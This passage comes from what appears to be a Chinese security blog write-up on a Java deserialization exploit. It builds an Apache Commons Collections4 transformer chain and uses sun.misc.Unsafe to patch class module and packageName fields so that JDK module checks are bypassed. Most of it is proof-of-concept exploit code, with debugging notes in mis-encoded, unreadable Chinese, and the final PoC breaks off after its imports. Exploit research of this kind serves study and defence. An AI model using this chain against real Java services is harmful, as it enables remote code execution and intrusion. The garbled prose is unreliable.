</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TransformerClosure</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">E</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¯ä»¥æˆåŠŸå¾—åˆ°<code>Unsafeå¯¹è±¡</code>ï¼Œniceæï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥æ‹¿æˆ‘æµ‹è¯•çš„pocäº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">TrAXFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;packageName&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(addr);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.class.getModule().getClass());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(&#34;1111&#34;+TrAXFilter.getPackageName());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        unsafe.getAndSetObject(TrAXFilter,addr,&#34;javax.xml&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.class.getDeclaredField(&#34;packageName&#34;));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(ObjectModule);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(ObjectModule.getClass().getName());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Class&lt;?&gt; TrAXFilter2 = Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(&#34;222&#34;+TrAXFilter2.getPackageName());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        final Class&lt;?&gt; cls = input.getClass();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        final Method method = cls.getMethod(iMethodName, iParamTypes);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        return (O) method.invoke(input, iArgs);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        InvokerTransformer invokerTransformer4 = new InvokerTransformer(&#34;getAndSetObject&#34;,new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;),60,&#34;javax.xml&#34;});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;get&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;setAccessible&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">true</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformerClosure</span><span class="w"> </span><span class="n">transformerClosure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerClosure</span><span class="p">(</span><span class="n">invokerTransformer2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="p">(</span><span class="n">transformerClosure</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredField&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">UnsafeClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">ClosureTransformer</span><span class="p">,</span><span class="n">invokerTransformer3</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Transformer</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;).getPackageName());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">transform</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o1</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">transform</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;).getPackageName());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="22-module">2.2 Module<a hidden class="anchor" aria-hidden="true" href="#22-module">#</a></h3>
<p>æœ¬ä»¥ä¸ºæœ€éš¾çš„é—®é¢˜å·²ç»è§£å†³äº†ï¼Œä½†æ˜¯åˆç”¨æ–°çš„é—®é¢˜äº†wwww</p>
<p>åé¢å…¶å®å°±åªæ˜¯è°ƒç”¨<code>unsafe.getAndSetObject</code>ï¼Œä»–çš„å‚æ•°éƒ½å¯ä»¥ä¼ ç„¶åè°ƒç”¨ã€‚æ­£å½“æˆ‘è¿™ä¹ˆæƒ³çš„æ—¶å€™çªç„¶ä¸€é˜µä¸å¥½çš„é¢„æ„Ÿ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œ<code>addr</code>æ˜¯ä¸€ä¸ª<code>longå€¼</code>ï¼Œå¯ä»¥ç›´æ¥ä¼ ï¼Œä½†æ˜¯<code>ObjectModule</code>æ˜¯ä¸€ä¸ª<code>Moduleç±»</code>å•Šï¼Œä¸èƒ½ååºåˆ—åŒ–ï¼Œè€Œä¸”ä¹Ÿä¸èƒ½é€šè¿‡å‰é¢çš„<code>CCé“¾transform</code>æ„é€ ï¼Œå› ä¸ºä½ <code>æ„é€ å‡ºæ¥ä¹Ÿä¼ ä¸åˆ°å‚æ•°çš„åœ°æ–¹</code>å§ï¼wwwï¼Œè¿™æˆªæ­¢æ¯”ä¸Šä¸€ä¸ªæ›´å¡æ­»ï¼Œç®€ç›´æ— è§£ï¼</p>
<h3 id="23-pn">2.3 pn<a hidden class="anchor" aria-hidden="true" href="#23-pn">#</a></h3>
<p>æ²¡åŠæ³•ï¼Œåªèƒ½æŠ±ç€æœ€åä¸€ä¸å¸Œæœ›å»çœ‹çœ‹<code>newInstance</code>ï¼Œæ˜¯æ€ä¹ˆè¿›è¡Œ<code>æ¨¡å—æ£€æµ‹</code>çš„ï¼Œçœ‹èƒ½ä¸èƒ½é€šè¿‡å…¶ä»–æ–¹æ³•ç»•è¿‡</p>
<p>ç„¶åè°ƒè¯• è°ƒè¯• è°ƒè¯• å•Š å‘ç°èµ·åˆå°±æ˜¯è¿™ä¸ªåœ°æ–¹ç»™æˆ‘ä»¬return falseçš„</p>
<p><img loading="lazy" src="../images/image-20250110200405827.png" alt="image-20250110200405827"  />
</p>
<p>å¾€ä¸‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿›è¡Œäº†<code>æ¨¡å—æ¯”è¾ƒ</code>ï¼Œä¸€æ ·çš„è¯ç›´æ¥å°±ä¼šè¿”å›<code>true</code></p>
<p><img loading="lazy" src="../images/image-20250110200548457.png" alt="image-20250110200548457"  />
</p>
<p>ç„¶ååé¢ä¼šè¿›å»åˆ°<code>Module</code>ç±»ï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯<code>è¢«è°ƒç”¨ç±»ï¼ˆTrAXFilterï¼‰</code>çš„<code>Module.isExported</code></p>
<p>ç„¶åè·Ÿåˆ°<code>implIsExportedOrOpen</code>ï¼Œç„¶åå‘ç°äº†è¿™ä¸ª<code>isNamed()</code>ï¼Œè¿™é‡Œä»£ç æ„æ€æ˜¯<code>è¢«è°ƒç”¨ç±»æ²¡æœ‰æ¨¡å—åå­—</code>çš„è¯å°±ç›´æ¥è¿”å›<code>true</code></p>
<p><img loading="lazy" src="../images/image-20250110201129028.png" alt="image-20250110201129028"  />
</p>
<p>é‚£ç®€å•å‘€ç”¨UnsafeæŠŠ<code>TrAXFilter</code>çš„<code>Module.name</code>æ”¹äº†ä¸ä¹…è¡Œäº†ï¼Œè¿™ä¸ªæƒ³æ³•æˆ‘èµ·åˆä¹Ÿè§‰å¾—å¿«æˆäº†ã€‚ä½†å…¶å®<code>Module</code>ç±»åšäº†é˜²æŠ¤ï¼Œjavaä¸ä¼šè®©æˆ‘ä»¬å¾—åˆ°è¿™ä¸ªçš„ç±»Fieldã€‚<code>getDeclaredFields()</code>å‡ºæ¥éƒ½æ˜¯ç©ºçš„ã€‚</p>
<p>ç„¶åè¿˜æƒ³è¿‡èƒ½ä¸èƒ½ç›´æ¥æŠŠ<code>Module</code>è®¾ç½®æˆ<code>null</code>å‘€ï¼Œ<code>null</code>èƒ½ååºåˆ—åŒ–å‘€ï¼Œå…¶å®çº¯æ‰¯ï¼Œåœ¨è¿›å…¥<code>isExported</code>æ–¹æ³•æ—¶å…¶å®å°±ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ï¼</p>
<p>ç„¶åç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªiféƒ½æ²¡å¸Œæœ›çš„ï¼Œ<code>this==other</code>çš„è¯å‰é¢ä»£ç å°±è¿”å›trueäº†ï¼Œç„¶åisOpen()æ˜¯false</p>
<p>é‚£åªæœ‰æœ€åç‚¹å¸Œæœ›å’¯ï¼Œè·Ÿè¿›<code>isStaticallyExportedOrOpen</code></p>
<p><img loading="lazy" src="../images/image-20250110202538652.png" alt="image-20250110202538652"  />
</p>
<p>ä¸Šé¢é‚£ä¸ªif<code>openPackages</code>æ˜¯nullï¼Œæ ¹æœ¬æ“ä½œä¸äº†ï¼Œç„¶åçœ‹åˆ°ä¸‹é¢è¿™ä¸ªif</p>
<p>è¿™ä¸ª<code>exportedPackages</code>æ˜¯ä¸€ä¸ªHashmapï¼Œä¼šä»è¿™é‡Œé¢è·å–å€¼ï¼Œè¿˜è®°å¾—è¿™ä¸ªpnæ˜¯ä»€ä¹ˆï¼Œæ˜¯<code>è¢«è°ƒç”¨ç±»çš„æ¨¡å—å(com.sun.org.apache.xalan.internal.xsltc.trax)</code>,æ­£å¸¸è¿™é‡Œæ˜¯æ²¡æœ‰å¯¹åº”çš„keyï¼Œè¿”å›nullçš„ã€‚</p>
<p>æˆ‘ä»¬è·Ÿè¿›<code>allows</code>ï¼Œwcï¼Œå‘ç°<code>åªè¦targetsä¸ä¸ºnull</code>ï¼Œæ€ä¹ˆæ ·éƒ½è¿”å›trueå•Šå•Šå•Šå•Šï¼ˆä¸‹å›¾æ˜¯æˆ‘å·²ç»æ“ä½œè¿‡çš„ï¼Œtargetsä¼šæœ‰å€¼</p>
<p><img loading="lazy" src="../images/image-20250110202936723.png" alt="image-20250110202936723"  />
</p>
<p>ä¹Ÿå°±æ˜¯<code>pn</code>åªè¦æ˜¯<code>exportedPackages</code>ä¸­çš„<code>ä»»æ„ä¸€ä¸ªkey</code>å€¼ä¸å°±è¡Œäº†ï¼Œæˆ‘ä»¬å†å›æƒ³ä¸‹pnæ€ä¹ˆæ¥çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">pkg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberClass</span><span class="p">.</span><span class="na">getPackageName</span><span class="p">();</span><span class="c1">//pkgå°±æ˜¯pn</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">return</span><span class="w"> </span><span class="n">memberModule</span><span class="p">.</span><span class="na">isExported</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span><span class="w"> </span><span class="n">currentModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="p">.</span><span class="na">classä¸­</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getPackageName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">pn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">packageName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">pn</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯Classç±»ä¸­<code>packageName</code>å±æ€§ï¼Œè¿™è¿˜ä¸å®¹æ˜“ï¼Ÿï¼ŒClassç±»ä¸­<code>module</code>å±æ€§ï¼Œæˆ‘éƒ½èƒ½æ”¹ï¼Œè¿˜æ”¹ä¸ä½ äº†ï¼Ÿ</p>
<p>ç›´æ¥ç”¨Unsafeä¿®æ”¹äº†<code>packageName</code></p>
<h1 id="0x04-poc">0x04 poc<a hidden class="anchor" aria-hidden="true" href="#0x04-poc">#</a></h1>
<p>å¿ƒå¿ƒå¿µå¿µçš„pocå‘œå‘œå‘œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
